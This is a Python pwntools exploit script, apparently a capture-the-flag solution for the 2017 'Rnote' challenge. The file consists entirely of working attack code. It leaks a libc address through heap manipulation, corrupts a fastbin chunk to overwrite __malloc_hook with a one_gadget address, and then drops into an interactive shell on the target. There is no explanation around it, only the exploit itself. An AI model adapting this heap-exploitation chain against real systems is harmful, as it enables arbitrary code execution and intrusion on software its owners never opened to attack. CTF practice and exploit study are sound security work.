#!/usr/bin python
from pwn import *

debug = 1
if debug:
	p = process('./Rnote')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('rnote.2017.teamrois.cn', 7777)
	libc = ELF('libc.so.6')

def add(size, title, content):
	p.recvuntil("Your choice: ")
	p.sendline("1")
	p.recvuntil("Please input the note size: ")
	p.sendline(str(size))
	p.recvuntil("Please input the title: ")
	p.send(title)
	p.recvuntil("Please input the content: ")
	p.send(content)

def delete(index):
	p.recvuntil("Your choice: ")
	p.sendline("2")
	p.recvuntil("Which Note do you want to delete: ")
	p.sendline(str(index))
	
def show(index):
	p.recvuntil("Your choice: ")
	p.sendline("3")
	p.recvuntil("Which Note do you want to show: ")
	p.sendline(str(index))
	p.recvuntil("note content: ")
	p.recv(8)

bss = 0x60213c
#first find a way to leak libc
title = 'a' * 15 + '\x0a'
add(0x100, title, 'a') #id 0
add(0x100, title, '\x00' * 0xd8 + '\x71' + '\x00' * 7) #id 1

delete(0)
add(0x100, title, 'a')
show(0)
#ub: 0x3C1760 re: 0x3C3B20
libc_addr = u64(p.recv(8)) - 0x3C1760 - 0x58
#print hex(libc_addr)
print "libc_addr: " + hex(libc_addr)
malloc_hook = libc_addr + 0x3C1740
print "malloc_hook: " + hex(malloc_hook)
one_gadget = libc_addr + 0x4647c
print "one_gadget: " + hex(one_gadget)
print "target: " + hex(malloc_hook + 0xd - 0x20)

#try fastbin unlink
title = 'a' * 16 + '\x0a'
add(0x70, title, 'a' * 0x30 + '\x00' * 8 + '\x71') #id 2

delete(2)
delete(1) 

title = 'a' * 15 + '\x0a'
add(0x100, title, '\x00' * 0xd8 + '\x71' + '\x00' * 7 + p64(malloc_hook + 0xd - 0x20))
add(0x60, title, 'a')
gdb.attach(p)


add(0x60, '\x0a', 'aaa' + p64(one_gadget))
#gdb.attach(p)
add(0x60, '\x0a', 'aaaa')

p.interactive()
